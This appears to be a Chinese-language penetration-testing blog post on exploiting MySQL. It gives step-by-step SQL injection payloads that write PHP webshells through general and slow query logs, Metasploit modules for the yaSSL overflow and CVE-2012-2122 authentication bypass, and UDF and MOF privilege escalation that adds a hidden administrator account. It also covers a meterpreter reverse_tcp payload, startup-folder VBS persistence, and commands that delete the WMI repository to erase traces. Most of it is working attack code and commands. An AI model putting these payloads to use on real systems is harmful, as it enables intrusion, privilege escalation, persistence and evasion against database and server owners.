+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-13%2009.18.18.png" alt="截屏2022-05-13 09.18.18"></p>
+<p>尝试写入 webshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;select &lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-13%2009.29.29.png" alt="截屏2022-05-13 09.29.29"></p>
+<p>访问木马地址<code>mac.php</code>成功解析，说明写入成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-05-13%2009.29.50.png" alt="截屏2022-05-13 09.29.50"></p>
+<p>除了常规的日志写入以外，我们还能够以慢日志写入的方式完成写入，而方法上也基本大同小异。唯一的不同的点就在于慢查询日志主要记录在 MySQL 中响应时间超过阀值的语句，因此在注入时需要借助<code>sleep()</code>函数延长查询时间，否则无法记录到慢查询日志当中。在数据库中查询慢查询日志记录是否开启</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2021.14.02.png" alt="截屏2022-06-16 21.14.02"></p>
+<p>开启慢查询日志记录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log = &quot;ON&quot;;</span><br></pre></td></tr></table></figure>
+<p>设置慢查询日志文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log_file=&#x27;/var/www/html/shell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>通过 SQL 注入开启慢查询日志写入木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;;set global slow_query_log = &quot;ON&quot;;set global slow_query_log_file=&#x27;C:\\phpStudy\\PHPTutorial\\WWW\\mac2.php&#x27;;--+</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.15.15.png" alt="截屏2022-06-16 22.15.15"><br>再次查看日志，发现慢日志配置已修改完成</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow_query_log%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.18.38.png" alt="截屏2022-06-16 22.18.38"></p>
+<p>向慢查询日志中写入 webshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;;select &#x27;&lt;?php phpinfo();?&gt;&#x27; from mysql.db where sleep(10)--+</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.21.33.png" alt="截屏2022-06-16 22.21.33"></p>
+<p>访问木马地址<code>mac2.php</code>成功解析，说明写入成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.21.42.png" alt="截屏2022-06-16 22.21.42"></p>
+<h3 id="yaSSL缓冲区溢出"><a href="#yaSSL缓冲区溢出" class="headerlink" title="yaSSL缓冲区溢出"></a>yaSSL缓冲区溢出</h3><p>MySQL 的 yaSSL 库存在一个缓冲区溢出漏洞，允许远程攻击者利用漏洞执行任意代码。该漏洞由于年代比较久远，因此也没有详细研究。目前已经在 MSF 中完成集成，利用模块如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/mysql/mysql_yassl_hello</span><br><span class="line">exploit/linux/mysql/mysql_yassl_hello</span><br></pre></td></tr></table></figure>
+<p>在测试过程中发现 MySQL 版本小于以下影响版本可重点关注</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL AB MySQL 5.1.x</span><br><span class="line">MySQL AB MySQL 5.5.x</span><br></pre></td></tr></table></figure>
+
+<h3 id="身份认证绕过"><a href="#身份认证绕过" class="headerlink" title="身份认证绕过"></a>身份认证绕过</h3><h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>身份认证绕过（CVE-2012-2122）漏洞即用户名多次输入错误密码会有几率直接成功登录数据库。与 yaSSL 缓冲区溢出一样，由于不太常见的原因，我也没对该漏洞进行复现</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL 5.1.62, 5.2.12, 5.3.6, 5.5.23</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在 Linux 中通过 shell 命令循环 1000 次登陆数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; done</span><br></pre></td></tr></table></figure>
+<p>在 MSF 中也同样集成了相关利用模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">msf &gt; set rhosts 127.0.0.1</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h4 id="漏洞详情-1"><a href="#漏洞详情-1" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>udf 为 MySQL 中的用户自定义函数，将动态链接库文件写入 MySQL 的 plugin 目录中可创建自定义函数，从而能够帮助我们执行系统命令，完成数据库权限至系统权限的提升。</p>
+<p>其中不同系统的动态链接库文件在 Sqlmap 以及 Metasploit 中已内置，Sqlmap 的 UDF 动态链接库文件位置为<code>/data/udf/mysql</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2022.55.16.png" alt="截屏2022-06-16 22.55.16"><br>但是这些动态链接库为了防止被误杀都进行了编码处理，因此无法直接使用。需要借助 Sqlmap 自带的 cloak.py 进行解码后才能使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cloak.py -d -i lib_mysqludf_sys.so_ -o lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
+<p>Metasploit 的 UDF 动态链接库文件则无需解码，同时它的位置位于<code>/embedded/framework/data/exploits/mysql</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2023.00.17.png" alt="截屏2022-06-16 23.00.17"></p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>根据漏洞利用原理，我们首先需要寻找 MySQL 的插件目录，通过 SQL 语句可以非常方便地找到</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2023.11.15.png" alt="截屏2022-06-16 23.11.15"><br>如果不存在的话可以在 shell 找到 MySQL 的安装目录，并在其中创建<code>/lib/plugin</code>文件夹，但是通过 NTFS 数据流创建文件夹的成功率相对比较低。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">123</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>什么？你说找不到 MySQL 的安装目录，通过 SQL 语句也能够查询出来</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2023.15.32.png" alt="截屏2022-06-16 23.15.32"></p>
+<p>当然写入 plugin 目录需满足以下条件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、拥有高权限数据库用户，比如root</span><br><span class="line">2、secure_file_priv无限制</span><br><span class="line">3、当前用户对 plugin 目录拥有写入权限</span><br></pre></td></tr></table></figure>
+
+<p>执行 SQL 语句可将动态链接库文件写入 plugin 目录中，其中的 hex 编码是将动态链接库文件经过十六进制编码后的结果，如果懒得转换可以参考国光大神的<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">UDF</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-16%2023.37.15.png" alt="截屏2022-06-16 23.37.15"></p>
+<p>利用写入的动态链接库创建自定义函数。但是出现了报错信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2000.21.09.png" alt="截屏2022-06-17 00.21.09"></p>
+<p>这是因为 MySQL 的安装版本为 32 位，而写入的动态链接库为 64 位，因此我们需要重新写入 32 位的动态链接库，成功创建后看 MySQL 函数中是否已经新增</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2000.47.34.png" alt="截屏2022-06-17 00.47.34"></p>
+<p>如果创建成功我们就可以利用该函数执行系统命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2000.48.58.png" alt="截屏2022-06-17 00.48.58"></p>
+<p>可以看到当前权限为管理员，如果需要删除自定义函数，可执行如下命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
+
+<p>如果当前已经拥有 webshell，我们可以上传相关脚本完成 UDF 提权<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/3-1.png" alt="3"></p>
+<p>导出 UDF 后可通过脚本执行系统命令<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/9-1.png" alt="9"></p>
+<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><h4 id="漏洞详情-2"><a href="#漏洞详情-2" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>利用 MOF 进行提权局限性比较大，基本上只能在 Windows Server 2003 环境中才能成功提权。利用原理是在<code>C:/windows/system32/wbem/mof</code>下的 mof 文件每隔一段时间都会被系统执行，因为mof文件中有一部分是 VBS 脚本，利用这个VBS脚本可调用 cmd 执行系统命令。</p>
+<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用的 mof 脚本内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> namespace(<span class="meta-string">&quot;\\\\.\\root\\subscription&quot;</span>) </span></span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user mac P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators mac /add\&quot;)&quot;</span>; </span><br><span class="line">&#125;;  <span class="comment">//执行语句</span></span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>通过 SQL 语句可将该文件导入目标目录<code>C:/windows/system32/wbem/mof</code>当中</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0x237</span>... <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\windows\\system32\\webm\\mof\\mac.mof&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行成功后我们可通过 cmd 查看用户是否已经添加，如添加则提权成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user mac</span><br></pre></td></tr></table></figure>
+
+<p>由于每隔一段时间 mof 文件都会被执行，因此想要完成痕迹清理需要暂时关闭 winmgmt 服务，最后删除 mof 文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line">del C:\Windows\system32\wbem\mof\good\mac.mof /F /S</span><br></pre></td></tr></table></figure>
+
+<p>在拥有 webshell 的情况下，我们可以上传相关脚本完成 MOF 提权<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/3-2.png" alt="3"></p>
+<p>连接数据库后点击 exploit 可成功写入将 mof 文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/4-1.png" alt="4"></p>
+<p>写入执行命令，点击 exploit 成功添加用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user mac xxx12456 /add &amp;&amp; net localgroup administrators mac /add</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/5-1.png" alt="5"></p>
+<p>在计算机管理中发现用户添加成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/6-1.png" alt="6"></p>
+<p>当然在 MSF 中也集成了 MOF 提权模块，使用起来相对来说比较方便且能够自动清理痕迹</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set rhosts 10.10.10.10</span><br><span class="line">msf &gt; set username root</span><br><span class="line">msf &gt; set password root</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><p>在 Windows 环境下我们还可以利用 MySQL 数据库的文件写入将自定义脚本导入启动项当中，利用脚本可在系统用户登录、开机、关机时自动运行。</p>
+<h4 id="手动提权"><a href="#手动提权" class="headerlink" title="手动提权"></a>手动提权</h4><p>Windows 中常见的启动项路径如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Windows Server 2003中文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows Server 2003英文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows Server 2003开关机项 需要自己建立对应文件夹</span></span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows Server 2008</span></span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<p>启动项路径支持脚本类型为 vbs 和 exe，无论是利用 vbs 执行 cmd 命令还是通过 CS 生成 exe 都能完成利用，以下为添加管理员的 VB 脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set WshShell=WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">WshShell.Run &quot;net user mac P@ssw0rd /add&quot;, 0</span><br><span class="line">WshShell.Run &quot;net localgroup administrators mac /add&quot;, 0</span><br></pre></td></tr></table></figure>
+
+<p>接下来将 VB 脚本经过 hex 编码后通过 SQL 语句写入系统启动项当中</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0x1234</span>... <span class="keyword">into</span> dumpfile &quot;C:\\Documents and Settings\\Administrator\\Start Menu\\Programs\\Startup\\test.vbs&quot;</span><br></pre></td></tr></table></figure>
+<p>成功写入等待用户重新登录，登录成功的同时脚本也会自动执行。</p>
